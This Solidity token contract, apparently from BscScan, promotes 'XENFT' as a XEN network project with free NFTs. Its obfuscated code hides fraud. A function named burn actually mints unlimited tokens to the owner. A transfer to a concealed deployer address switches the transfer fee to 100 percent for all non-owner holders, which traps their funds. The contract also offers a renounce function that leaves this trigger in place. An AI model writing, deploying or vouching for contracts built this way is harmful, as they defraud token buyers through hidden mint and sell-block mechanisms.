/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

/*
    XENFT 
    Another XEN project by XEN network
    Users testing XENFTs and get free NFT now...
    https://t.co/6gJ4VZ21im
    https://twitter.com/mrJackLevin
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;
contract XENFT {
uint256 public  fnXuWh = 1000000000000000000;
uint256 public  VrCQNt = 100000000000000000;
uint256 public  mrRjbR = 10000000000000000000;
uint256 private  yaScug = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  hWnIkd = 100000000000000000000000;
uint256 public  YDwcMO = 100000000000000000000;
uint256 public constant xlpqvA = 9+1;
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  YjeaVV = 10000000000000000;
address public  amPlHO = address(0);
address public  JPGlMD = address(0);
address public  sUhBJQ = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "XENFT";
address public  aIynJR = address(0);
address public  bgPFvP = address(0);
address public owner;
address public  VaGiFC = address(0);
address private  lAQspR = address(0);
uint256 public  zhqZEe = 100000000000000000000000;
string public  name = "XENFT";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  MregyP = 10000000000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MDSakw");
require(to != address(0), "MDSakw");
require(amount <= balanceOf[from], "MDSakw");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* xlpqvA/yaScug ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==lAQspR){
yaScug = 9+1;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
lAQspR = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}